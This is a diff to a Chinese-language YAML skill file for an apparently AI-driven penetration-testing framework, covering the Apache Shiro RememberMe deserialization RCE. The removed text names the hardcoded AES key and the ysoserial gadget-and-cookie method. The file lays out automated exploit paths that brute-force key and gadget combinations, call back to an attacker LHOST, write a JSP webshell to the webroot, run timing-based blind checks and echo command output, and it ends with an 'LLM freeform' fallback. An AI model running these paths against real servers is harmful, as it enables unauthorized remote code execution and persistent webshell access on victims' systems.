@@ -2,25 +2,9 @@ skill_id: shiro_rce
 name: "Apache Shiro RememberMe 反序列化 RCE"
 category: java_deserialization
 phase: foothold
-version: "5.0"
+version: "5.1"
 
-principle: |
-  Apache Shiro 的 RememberMe 功能使用 AES 加密序列化的用户身份信息。
-
-  漏洞根因：
-  - Shiro 1.2.4 及更早版本使用硬编码 AES 密钥 kPH+bIxk5D2deZiIxcaaaA==
-  - 大量项目使用了其他已知/泄露的密钥
-
-  利用方式：
-  - 用 ysoserial (JDK 8) 生成 CommonsBeanutils1 gadget payload
-  - AES-CBC 加密 → Base64 → rememberMe Cookie
-  - 目标反序列化执行命令
-
-  检测方式：
-  - 方式 A（推荐）: 回调检测 — 命令回连攻击机，确认 RCE
-  - 方式 B（NAT）: 写 webshell — 命令写 JSP 到 webroot，HTTP 访问验证
-
-  关键约束：ysoserial 必须用 JDK 8 运行。
+# 漏洞原理详见 SKILL.md
 
 match:
   rules:
@@ -95,12 +79,6 @@ exploit_paths:
   - path_id: shiro_callback
     name: "shiro_exploit.py 回调检测"
     priority: 1
-    principle: |
-      使用 shiro_exploit.py 自动完成:
-      1. 用 JDK 8 + ysoserial 预生成各 gadget 的回调 payload
-      2. 启动 HTTP 回调监听器
-      3. 遍历 密钥×gadget 组合，发送加密 Cookie
-      4. 收到回调即确认 RCE
     conditions:
       shiro_confirmed: true
       lhost_available: true
@@ -109,7 +87,7 @@ exploit_paths:
         description: "回调检测爆破（密钥×gadget 自动遍历）"
         publish_ports: [39876]
         command: |
-          python3 /opt/shiro_exploit.py {ENDPOINT} \
+          python3 {skill_dir}/scripts/shiro_exploit.py {ENDPOINT} \
             --lhost "$LHOST" --port 39876
         timeout: 420
         success_criteria:
@@ -119,74 +97,17 @@ exploit_paths:
         evidence_capture:
           shell_type: "rce_shiro_callback"
 
-  # ═══ 路径 B: 写 webshell 验证（NAT 环境无回调）═══
-  - path_id: shiro_webshell
-    name: "Shiro 写 webshell 验证 RCE（NAT 环境）"
-    priority: 10
-    principle: |
-      无回调环境下:
-      1. 用 ysoserial 生成 payload，命令为写 JSP webshell 到 webroot
-      2. 遍历 密钥×gadget 组合发送
-      3. HTTP 访问 webshell 路径验证是否写入成功
-    conditions:
-      shiro_confirmed: true
-    steps:
-      - id: shiro_write_shell
-        description: "遍历密钥+gadget 写 webshell，HTTP 验证"
-        command: "/opt/shiro_webshell_brute.sh {ENDPOINT} {TARGET_IP} {TARGET_PORT}"
-        timeout: 600
-        success_criteria:
-          stdout_contains_any: ["SHIRO_RCE_CONFIRMED"]
-        on_success: conclude_success
-        on_fail: next_path
-        evidence_capture:
-          shell_type: "rce_shiro_webshell"
-
-  # ═══ 路径 B: 时序盲检测（无回连、无 webroot 依赖）═══
-  - path_id: shiro_blind
-    name: "shiro_exploit.py 时序盲检测"
-    priority: 5
-    principle: |
-      用 sleep 命令验证 RCE，不依赖回连或 webroot:
-      1. 先收集目标基线响应时间（正常请求的 RTT）
-      2. 用 JDK 8 + ysoserial 生成各 gadget 的 sleep N payload
-      3. 遍历 密钥×gadget 组合，发送加密 Cookie，测量响应时间
-      4. 响应时间显著超过基线 → RCE 确认
-    conditions:
-      shiro_confirmed: true
-    steps:
-      - id: shiro_blind
-        description: "时序盲检测爆破（sleep 验证）"
-        command: |
-          python3 /opt/shiro_exploit.py {ENDPOINT} --blind
-        timeout: 600
-        success_criteria:
-          stdout_contains_any: ["SHIRO_RCE_CONFIRMED"]
-        on_success: conclude_success
-        on_fail: next_path
-        evidence_capture:
-          shell_type: "rce_shiro_blind"
-
-  # ═══ 路径 C: 回显检测（su18 EX-TomcatEcho，命令输出写回 HTTP 响应）═══
+  # 路径 B: 回显检测（su18 EX-TomcatEcho）
   - path_id: shiro_echo
     name: "shiro_exploit.py 回显检测（TomcatEcho）"
     priority: 3
-    principle: |
-      用 su18 ysoserial 的 EX-TomcatEcho 在反序列化时注入回显机制：
-      1. 生成 EX-TomcatEcho payload（从当前线程找到 request/response）
-      2. 遍历 密钥×gadget 组合，发送加密 Cookie + X-Token-Data: id 头
-      3. 目标反序列化 → 读取 X-Token-Data 头 → 执行命令 → 写入 response
-      4. HTTP 响应体中含 uid= 等命令输出 → RCE 确认
-
-      优势：不依赖回连、不依赖 webroot、不依赖时序、命令输出直读。
-      需要 su18 ysoserial（/opt/ysuserial.jar）。
     conditions:
       shiro_confirmed: true
     steps:
       - id: shiro_echo
         description: "回显检测爆破（EX-TomcatEcho，命令输出在 HTTP 响应中）"
         command: |
-          python3 /opt/shiro_exploit.py {ENDPOINT} --echo
+          python3 {skill_dir}/scripts/shiro_exploit.py {ENDPOINT} --echo
         timeout: 600
         success_criteria:
           stdout_contains_any: ["SHIRO_RCE_CONFIRMED"]
@@ -195,7 +116,44 @@ exploit_paths:
         evidence_capture:
           shell_type: "rce_shiro_echo"
 
-  # ═══ 路径 D: LLM 兜底 ═══
+  # 路径 C: 写 webshell 验证（NAT 环境无回调）
+  - path_id: shiro_webshell
+    name: "Shiro 写 webshell 验证 RCE（NAT 环境）"
+    priority: 10
+    conditions:
+      shiro_confirmed: true
+    steps:
+      - id: shiro_write_shell
+        description: "遍历密钥+gadget 写 webshell，HTTP 验证"
+        command: "bash {skill_dir}/scripts/shiro_webshell_brute.sh {ENDPOINT} {TARGET_IP} {TARGET_PORT}"
+        timeout: 600
+        success_criteria:
+          stdout_contains_any: ["SHIRO_RCE_CONFIRMED"]
+        on_success: conclude_success
+        on_fail: next_path
+        evidence_capture:
+          shell_type: "rce_shiro_webshell"
+
+  # 路径 D: 时序盲检测
+  - path_id: shiro_blind
+    name: "shiro_exploit.py 时序盲检测"
+    priority: 5
+    conditions:
+      shiro_confirmed: true
+    steps:
+      - id: shiro_blind
+        description: "时序盲检测爆破（sleep 验证）"
+        command: |
+          python3 {skill_dir}/scripts/shiro_exploit.py {ENDPOINT} --blind
+        timeout: 600
+        success_criteria:
+          stdout_contains_any: ["SHIRO_RCE_CONFIRMED"]
+        on_success: conclude_success
+        on_fail: next_path
+        evidence_capture:
+          shell_type: "rce_shiro_blind"
+
+  # 路径 E: LLM 兜底
   - path_id: llm_freeform
     name: "LLM 自由推理（限定 Shiro 漏洞范围）"
     priority: 99
